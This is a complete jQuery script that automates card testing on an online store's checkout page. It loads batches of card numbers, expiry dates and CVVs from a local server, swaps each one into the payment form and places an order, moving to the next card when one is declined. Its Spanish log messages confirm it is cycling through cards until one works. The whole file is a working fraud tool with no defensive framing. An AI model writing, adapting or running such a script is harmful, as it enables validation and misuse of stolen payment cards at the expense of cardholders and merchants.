var baseUrl = "localhost";
var url = "http://" + baseUrl + ":5000/post";
var iteration = null;
var request = {
     url: url,
     dataType: "jsonp"
}
var cards = function(arr) {
	var i = 0;
	var limit = 20;
	var percentage = 30;
	var len = Math.ceil(arr.length * (percentage / 100));

	iteration = function() {
		if( i < len ) {
			var json = arr[i++];
			sessionStorage.card = JSON.stringify(json);

			console.log(json);

			var boton1 = $("#COAC3PayCCDeleteLnk0").click();

			var j = 0;
			var interval = setInterval(function(){
				i++;
				console.log("Esperando el boton de delete");
				if( !$(".delete-confirmation-box").hasClass("hide-content") ) {
					clearInterval(interval);
					var boton2 = $("#COAC3PayCCConfirmDelBtn0").click();

					j = 0;
					var interval2 = setInterval(function(){
						console.log("Esperando la confirmacion de delete");
						if( $("#COAC3PayCardNumber").length ) {
							clearInterval(interval2);

							$(".payment-option").addClass("payment-inactive")

							$("#COAC3PayCardNumber").val( json.card );

							if( json.card[0] == 4 )
								$(".visa").removeClass("payment-inactive")
							else
								$(".mastercard").removeClass("payment-inactive")


							$($("div[data-name=expiryMonth] button")[ Number(json.mon) ]).click();

							$($("div[data-name=expiryYear] button")[ Number(json.year) - 15 ]).click();

							$("#COAC3PayCardSecCode").val( json.cvv );

							var boton3 = $("#COAC3PayReviewOrderBtn").click();

							j = 0;
							var interval3 = setInterval(function(){
								console.log("Esperando el boton de place order");
								if( !$(".accordion-module.checkout-accordion-module").hasClass("edit-mode") ) {
									clearInterval(interval3);

									$("#COPlaceOrderBtn").click();

									j = 0;
									var interval4 = setInterval(function() {
										console.log("Esperando que se trate de hacer la orden");
										if( $("#COAC3PayCCDeleteLnk0").length ) {
											clearInterval(interval4);
											console.log("No paso, probemos otra");
											setTimeout(iteration, 2000);
										}
										else if(j >= limit) {
											boton3.click();
											j = 0;
										}

									}, 5000);
								}
								else if(j >= limit) {
									$("#COAC3PayReviewOrderBtn").click();
									j = 0;
								}
							}, 5000);
						}
						else if(j >= limit) {
							boton2.click();
							j = 0;
						}
					}, 5000);
				}
				else if(j >= limit) {
					boton1.click();
					j = 0;
				}
			}, 5000);

		}
		else {
			$.ajax(request)
			.success(cards);;
		}

	}

	iteration();
};
$.ajax(request)
.success(cards);